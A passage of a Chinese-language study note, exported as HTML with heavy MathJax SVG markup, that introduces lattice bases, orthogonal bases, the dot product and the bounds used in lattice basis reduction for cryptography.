121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g></g><rect width="932.6" height="60" x="120" y="220"/></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">  </font></p>
<h1 id="bEnIk">格基规约</h1>
<h2 id="qD9aR">基</h2>
<font style="color:rgb(0, 0, 0);">当我们定义一个格 L 时，实际是定义了由多个向量组成的一个向量空间</font>

<p><font style="color:rgb(0, 0, 0);">例如  </font></p>
<p><font style="color:rgb(0, 0, 0);">                                                                  </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="11.162ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 4933.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g></g><g data-mml-node="mo" transform="translate(958.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mrow" transform="translate(2014.6,0)"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mtable" transform="translate(278,0)"><g data-mml-node="mtr"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mn" transform="translate(600,-150) scale(0.707)"><path data-c="1D7CF" d="M481 0L294 3Q136 3 109 0H96V62H227V304Q227 546 225 546Q169 529 97 529H80V591H97Q231 591 308 647L319 655H333Q355 655 359 644Q361 640 361 351V62H494V0H481Z"/></g></g><g data-mml-node="mtext" transform="translate(1056.6,0)"><path data-c="A0" d=""/></g><g data-mml-node="msub" transform="translate(1306.6,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mn" transform="translate(600,-150) scale(0.707)"><path data-c="1D7D0" d="M175 580Q175 578 185 572T205 551T215 510Q215 467 191 449T137 430Q107 430 83 448T58 511Q58 558 91 592T168 640T259 654Q328 654 383 637Q451 610 484 563T517 459Q517 401 482 360T368 262Q340 243 265 184L210 140H274Q416 140 429 145Q439 148 447 186T455 237H517V233Q516 230 501 119Q489 9 486 4V0H57V25Q57 51 58 54Q60 57 109 106T215 214T288 291Q364 377 364 458Q364 515 328 553T231 592Q214 592 201 589T181 584T175 580Z"/></g></g></g></g></g><g data-mml-node="mo" transform="translate(2641.2,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">   </font></p>
<p><font style="color:rgb(0, 0, 0);"> 则表示每一个格点都能由 α1</font><strong><font style="color:rgb(0, 0, 0);">v1</font></strong><font style="color:rgb(0, 0, 0);">+α2</font><strong><font style="color:rgb(0, 0, 0);">v2 </font></strong><font style="color:rgb(0, 0, 0);">构成，其中 α1 , α2 ∈ Z。</font></p>
<p><font style="color:rgb(0, 0, 0);">例如对于</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/47928994/1743036690656-a65e11c9-3e2f-4f37-9044-49012ad5b616.png"></p>
<p><font style="color:rgb(0, 0, 0);">格点 (0 , 2)=(1 , 1)+(1 , −1)<br></font><font style="color:rgb(0, 0, 0);">格点 (12 , 2)=7(1 , 1)+5(1 , −1)</font></p>
<p><font style="color:rgb(0, 0, 0);">则 </font><strong><font style="color:rgb(0, 0, 0);">v1 </font></strong><font style="color:rgb(0, 0, 0);">, </font><strong><font style="color:rgb(0, 0, 0);">v2 </font></strong><font style="color:rgb(0, 0, 0);">便是格 L 的一组基。</font></p>
<p><font style="color:rgb(0, 0, 0);">显然一个格可以有很多基，而在密码学中我们则是要找到一组特殊的基。</font></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<h2 id="LzLDI"><font style="color:rgb(0, 0, 0);">正交基</font></h2>
<font style="color:rgb(0, 0, 0);">对于一组基 </font>**<font style="color:rgb(0, 0, 0);">v1</font>**<font style="color:rgb(0, 0, 0);">，…，</font>**<font style="color:rgb(0, 0, 0);">vn </font>**<font style="color:rgb(0, 0, 0);">满足</font>

<p><font style="color:rgb(0, 0, 0);">                                                        </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex;" xmlns="http://www.w3.org/2000/svg" width="17.933ex" height="2.286ex" role="img" focusable="false" viewbox="0 -716 7926.5 1010.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mi" transform="translate(600,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(1116.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="msub" transform="translate(1616.4,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mi" transform="translate(600,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/></g></g><g data-mml-node="mo" transform="translate(2835.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(3891.3,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(4391.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mstyle" transform="translate(4669.3,0)"><g data-mml-node="mspace"/></g><g data-mml-node="mi" transform="translate(5835.9,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(6458.7,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"/></g><g data-mml-node="mi" transform="translate(7514.5,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">    </font></p>
<p>则成为一组正交基。</p>
<p>点积：</p>
<pre><code>                                                     $ \boldsymbol {v} = (x_1, \ldots, x_n) $ 

                                                     $ \boldsymbol {u} = (y_1, \ldots, y_n) $ 
</code></pre>
<p>则</p>
<pre><code>                                               $ \boldsymbol {v} \cdot \boldsymbol {u} = x_1y_1 + \cdots + x_ny_n $  
</code></pre>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<h2 id="Pl0QC"><font style="color:rgb(0, 0, 0);">格基规约</font></h2>
<font style="color:rgb(0, 0, 0);">之前我们在Hermite定理中讨论了最短向量的上界，对于一组基来说也有定理：</font>

<p><font style="color:rgb(0, 0, 0);">                                                  </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="28.263ex" height="2.587ex" role="img" focusable="false" viewbox="0 -893.3 12492.3 1143.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mn" transform="translate(600,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mo" transform="translate(1281.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mo" transform="translate(1559.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(1837.6,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mn" transform="translate(600,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mo" transform="translate(2841.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mo" transform="translate(3285.8,0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"/></g><g data-mml-node="mo" transform="translate(4624.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(4902.4,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mi" transform="translate(600,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(5976.7,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mo" transform="translate(6532.5,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"/></g><g data-mml-node="msup" transform="translate(7588.3,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="TeXAtom" transform="translate(633,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(600,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="mn" transform="translate(1100,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g></g><g data-mml-node="mo" transform="translate(9569.3,0)"><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z"/><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(556,0)"/><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(1000,0)"/></g><g data-mml-node="mo" transform="translate(10958.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(11347.3,0)"><path data-c="1D473" d="M258 624H235Q214 624 209 626T199 639Q203 678 216 684Q220 686 239 686Q290 684 409 684Q454 684 492 684T552 685T579 686Q603 686 603 668Q599 632 587 626Q583 624 520 624H457L388 344Q317 64 317 63T353 62H390Q418 62 440 64T493 78T548 110T598 169T643 261Q651 282 655 285T680 289Q696 289 700 288T709 279Q711 274 711 269Q710 265 663 138T613 8Q611 4 602 0H58Q47 5 43 15Q47 54 60 60Q64 62 113 62H162L302 623Q302 624 258 624Z"/></g><g data-mml-node="mo" transform="translate(12103.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">  </font></p>
<p><font style="color:rgb(0, 0, 0);">同时还有Hadamard不等式给出了下界</font></p>
<p><font style="color:rgb(0, 0, 0);">                                                      </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="23.781ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 10511.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mn" transform="translate(600,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mo" transform="translate(1281.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mo" transform="translate(1559.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(1837.6,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mn" transform="translate(600,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mo" transform="translate(2841.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mo" transform="translate(3285.8,0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"/></g><g data-mml-node="mo" transform="translate(4624.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(4902.4,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mi" transform="translate(600,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(5976.7,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 